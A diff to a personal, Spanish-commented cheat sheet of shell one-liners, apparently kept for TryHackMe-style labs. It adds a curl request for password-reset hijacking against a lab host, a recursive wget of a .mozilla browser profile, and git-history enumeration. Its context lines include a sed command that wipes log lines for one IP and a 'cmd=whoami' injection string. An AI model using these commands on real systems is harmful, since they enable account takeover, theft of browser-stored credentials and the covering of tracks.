@@ -33,6 +33,8 @@ paste -sd "," FILE  # agrega una coma entre palabras
 head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' # generador de passwords
 sed -i '/192\.168\.0\.1/d' /var/log/messages.log # elimina todas las lineas que contienen la ip
 -
+curl 'http://10.10.154.13/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=test@customer.acmeitsupport.thm' # reset password hijacking
+-
 awk '{print "https://"$1}'
 awk '{print $1 ":" $2}'
 awk '{print $1}' FS=':' # FS=delimitador
@@ -47,6 +49,7 @@ echo "testing%3Fcmd%3Dwhoami" | php -R 'echo urldecode($argn);'
 -
 grep -oP '\[.*?\]' # quita los corchetes
 grep -a '[0-9][0-9]:[0-9][0-9]:[0-9][0-9]' /var/log/apache2/access.log # formato: HH:MM:SS
+grep -oP '".*?"' bytearray.txt # filtra todo lo que esta entre comillas
 
 # One-liners
 for seq in $(seq 5); do curl -s -i http://10.10.74.120/post?id=$seq | grep 'Post not found' &>/dev/null && echo "post $seq no existe" || echo "post>for i in admin dev test backup; do gobuster -u "url"/$i -w "wordlist" -t -o outputFile$i.txt; done # bucle para enum directorios
@@ -70,6 +73,8 @@ masscan --arp ip/mask > file
 sudo nmap -RP ip
 
 # varios
+wget -r --no-parent http://10.10.150.153:9000/.mozilla/  # descarga recursiva
+----
 ping -c ip -R # muestra ruta del ping hasta el destino
 ----
 kill -9 $(jobs -p) # elimina los trabajos
@@ -101,6 +106,9 @@ EOT
 # git initial config
 git config --global user.name "John Doe"
 git config --global user.email johndoe@example.com
+----
+# git enumeration
+git log -p # dentro de la carpeta .git
 ----
 # fix snd-hda-intel en ubuntu 20.04
 sudo tee /etc/modprobe.d/snd-hda-intel-fix.conf <<< 'options snd-hda-intel probe_mask=1'
